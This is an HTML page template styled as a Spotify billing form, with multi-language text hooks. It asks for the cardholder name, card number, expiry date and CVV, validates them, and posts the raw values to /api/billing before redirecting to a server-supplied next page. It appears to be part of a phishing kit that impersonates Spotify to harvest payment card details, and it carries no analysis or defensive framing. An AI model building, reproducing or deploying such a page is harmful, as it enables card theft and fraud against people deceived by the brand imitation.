<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ get_text(lang, 'billing_title') }} - Spotify</title>
    <link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico">
    <style>
        *{box-sizing:border-box;margin:0;padding:0;font-family:Circular,Spotify Circular,Helvetica,Arial,sans-serif}
        body{background-color:#121212;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .card{background-color:#000;width:100%;max-width:500px;padding:40px;border-radius:8px;box-shadow:0 4px 60px rgba(0,0,0,0.5)}
        h1{text-align:center;font-size:1.75rem;font-weight:700;margin-bottom:10px}
        p{text-align:center;font-size:.9rem;color:#b3b3b3;margin-bottom:30px}
        .form-group{margin-bottom:20px}
        .form-row{display:flex;gap:15px}
        label{display:block;font-size:.875rem;font-weight:700;margin-bottom:8px}
        input{width:100%;padding:14px;background:#121212;border:1px solid #727272;border-radius:4px;color:#fff;font-size:1rem}
        input:focus{outline:none;border-color:#fff}
        .submit-btn{width:100%;padding:14px;background-color:#1db954;color:#000;border:none;border-radius:500px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:10px}
        .submit-btn:hover{background-color:#1ed760}
        .lang-indicator{text-align:center;font-size:11px;color:#6c6c8a;margin-bottom:10px}
        .card-icon{display:flex;gap:8px;justify-content:flex-end;margin-bottom:10px}
        .card-icon span{font-size:28px;opacity:0.4;transition:opacity .3s}
        .card-icon span.active{opacity:1}
        .error-msg{color:#e91429;font-size:.75rem;margin-top:4px;display:none}
        input.error{border-color:#e91429}
    </style>
</head>
<body>
    <div class="card">
        <div class="lang-indicator">🌍 {{ get_text(lang, 'name') }}</div>
        <h1>{{ get_text(lang, 'billing_title') }}</h1>
        <p>{{ get_text(lang, 'billing_subtitle') }}</p>

        <div class="card-icon">
            <span id="iconVisa">💳</span>
            <span id="iconMastercard">💳</span>
            <span id="iconAmex">💳</span>
            <span id="iconDiscover">💳</span>
        </div>

        <form id="billingForm" novalidate>
            <div class="form-group">
                <label>{{ get_text(lang, 'billing_cardholder') }}</label>
                <input type="text" id="cardHolder" name="cardHolder" required placeholder="{{ get_text(lang, 'billing_cardholder') }}" autocomplete="cc-name">
                <div class="error-msg" id="cardHolderError">Please enter the cardholder name</div>
            </div>
            <div class="form-group">
                <label>{{ get_text(lang, 'billing_cardnumber') }}</label>
                <input type="text" id="cardNumber" name="cardNumber" required maxlength="19" placeholder="4111 2222 3333 4444" autocomplete="cc-number">
                <div class="error-msg" id="cardNumberError">Please enter a valid card number</div>
            </div>
            <div class="form-row">
                <div class="form-group" style="flex:1.5;">
                    <label>{{ get_text(lang, 'billing_expiry') }}</label>
                    <input type="text" id="expiry" name="expiry" required maxlength="5" placeholder="MM/YY" autocomplete="cc-exp">
                    <div class="error-msg" id="expiryError">Please enter a valid expiry date</div>
                </div>
                <div class="form-group" style="flex:1;">
                    <label>{{ get_text(lang, 'billing_cvv') }}</label>
                    <input type="password" id="cvv" name="cvv" required maxlength="4" placeholder="123" autocomplete="cc-csc">
                    <div class="error-msg" id="cvvError">Please enter a valid CVV</div>
                </div>
            </div>
            <button type="submit" class="submit-btn" id="submitBtn">{{ get_text(lang, 'billing_button') }}</button>
        </form>
    </div>

    <script>
        function isValidCardNumber(number) {
            const clean = number.replace(/\s/g, '');
            if (!/^\d{13,19}$/.test(clean)) return false;
            let sum = 0, double = false;
            for (let i = clean.length - 1; i >= 0; i--) {
                let digit = parseInt(clean[i]);
                if (double) { digit *= 2; if (digit > 9) digit -= 9; }
                sum += digit;
                double = !double;
            }
            return sum % 10 === 0;
        }

        function getCardType(number) {
            const clean = number.replace(/\s/g, '');
            if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(clean)) return 'visa';
            if (/^5[1-5][0-9]{14}$/.test(clean)) return 'mastercard';
            if (/^3[47][0-9]{13}$/.test(clean)) return 'amex';
            if (/^6(?:011|5[0-9]{2})[0-9]{12}$/.test(clean)) return 'discover';
            return null;
        }

        function updateCardIcon(number) {
            const clean = number.replace(/\s/g, '');
            ['visa','mastercard','amex','discover'].forEach(t => document.getElementById('icon'+t.charAt(0).toUpperCase()+t.slice(1)).className = '');
            const type = getCardType(clean);
            if (type) document.getElementById('icon'+type.charAt(0).toUpperCase()+type.slice(1)).className = 'active';
        }

        function formatCardNumber(value) {
            const clean = value.replace(/\D/g, '');
            const parts = [];
            for (let i = 0; i < clean.length; i += 4) parts.push(clean.substring(i, i+4));
            return parts.join(' ').trim();
        }

        function isValidExpiry(value) {
            const clean = value.replace(/\D/g, '');
            if (clean.length !== 4) return false;
            const month = parseInt(clean.substring(0,2));
            const year = parseInt(clean.substring(2,4));
            if (month < 1 || month > 12) return false;
            const now = new Date();
            const currentYear = now.getFullYear() % 100;
            const currentMonth = now.getMonth() + 1;
            if (year < currentYear) return false;
            if (year === currentYear && month < currentMonth) return false;
            return true;
        }

        function formatExpiry(value) {
            const clean = value.replace(/\D/g, '');
            if (clean.length <= 2) return clean;
            return clean.substring(0,2) + '/' + clean.substring(2,4);
        }

        const cardNumberInput = document.getElementById('cardNumber');
        const expiryInput = document.getElementById('expiry');
        const cvvInput = document.getElementById('cvv');
        const cardHolderInput = document.getElementById('cardHolder');

        function validateAllFields() {
            const cardClean = cardNumberInput.value.replace(/\s/g, '');
            const cardError = document.getElementById('cardNumberError');
            if (cardClean.length > 0) {
                if (!isValidCardNumber(cardClean)) {
                    cardNumberInput.classList.add('error');
                    cardError.style.display = 'block';
                } else {
                    cardNumberInput.classList.remove('error');
                    cardError.style.display = 'none';
                }
            }
            if (expiryInput.value.length === 5) {
                const expError = document.getElementById('expiryError');
                if (!isValidExpiry(expiryInput.value)) {
                    expiryInput.classList.add('error');
                    expError.style.display = 'block';
                } else {
                    expiryInput.classList.remove('error');
                    expError.style.display = 'none';
                }
            }
            if (cvvInput.value.length > 0) {
                const cvvError = document.getElementById('cvvError');
                if (cvvInput.value.length < 3) {
                    cvvInput.classList.add('error');
                    cvvError.style.display = 'block';
                } else {
                    cvvInput.classList.remove('error');
                    cvvError.style.display = 'none';
                }
            }
            if (cardHolderInput.value.trim().length > 0) {
                const chError = document.getElementById('cardHolderError');
                if (cardHolderInput.value.trim().length < 2) {
                    cardHolderInput.classList.add('error');
                    chError.style.display = 'block';
                } else {
                    cardHolderInput.classList.remove('error');
                    chError.style.display = 'none';
                }
            }
        }

        cardNumberInput.addEventListener('input', function() {
            const formatted = formatCardNumber(this.value);
            this.value = formatted;
            updateCardIcon(formatted);
            const clean = formatted.replace(/\s/g, '');
            const errorEl = document.getElementById('cardNumberError');
            if (clean.length > 0) {
                if (!isValidCardNumber(clean)) {
                    this.classList.add('error');
                    errorEl.style.display = 'block';
                } else {
                    this.classList.remove('error');
                    errorEl.style.display = 'none';
                }
            } else {
                this.classList.remove('error');
                errorEl.style.display = 'none';
            }
        });

        expiryInput.addEventListener('input', function() {
            const formatted = formatExpiry(this.value);
            this.value = formatted;
            const errorEl = document.getElementById('expiryError');
            if (this.value.length === 5) {
                if (!isValidExpiry(this.value)) {
                    this.classList.add('error');
                    errorEl.style.display = 'block';
                } else {
                    this.classList.remove('error');
                    errorEl.style.display = 'none';
                }
            } else {
                this.classList.remove('error');
                errorEl.style.display = 'none';
            }
        });

        cvvInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            const errorEl = document.getElementById('cvvError');
            if (this.value.length > 0 && this.value.length < 3) {
                this.classList.add('error');
                errorEl.style.display = 'block';
            } else {
                this.classList.remove('error');
                errorEl.style.display = 'none';
            }
        });

        cardHolderInput.addEventListener('input', function() {
            const errorEl = document.getElementById('cardHolderError');
            if (this.value.trim().length < 2 && this.value.trim().length > 0) {
                this.classList.add('error');
                errorEl.style.display = 'block';
            } else {
                this.classList.remove('error');
                errorEl.style.display = 'none';
            }
        });

        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(validateAllFields, 500);
            setTimeout(validateAllFields, 1500);
        });

        document.getElementById('billingForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const cardHolder = cardHolderInput.value.trim();
            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
            const expiry = expiryInput.value;
            const cvv = cvvInput.value;

            let isValid = true;
            if (cardHolder.length < 2) {
                cardHolderInput.classList.add('error');
                document.getElementById('cardHolderError').style.display = 'block';
                isValid = false;
            }
            if (!isValidCardNumber(cardNumber)) {
                cardNumberInput.classList.add('error');
                document.getElementById('cardNumberError').style.display = 'block';
                isValid = false;
            }
            if (!isValidExpiry(expiry)) {
                expiryInput.classList.add('error');
                document.getElementById('expiryError').style.display = 'block';
                isValid = false;
            }
            if (cvv.length < 3 || cvv.length > 4) {
                cvvInput.classList.add('error');
                document.getElementById('cvvError').style.display = 'block';
                isValid = false;
            }
            if (!isValid) {
                const firstError = document.querySelector('.error');
                if (firstError) firstError.focus();
                return;
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.textContent = '⏳ Verifying...';
            try {
                const res = await fetch('/api/billing', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cardHolder, cardNumber, expiry, cvv })
                });
                const data = await res.json();
                if (data.status === 'success') {
                    window.location.href = data.next;
                } else {
                    alert('Error, please try again.');
                    btn.disabled = false;
                    btn.textContent = '{{ get_text(lang, "billing_button") }}';
                }
            } catch(err) {
                alert('Error, please try again.');
                btn.disabled = false;
                btn.textContent = '{{ get_text(lang, "billing_button") }}';
            }
        });
    </script>
</body>
</html>
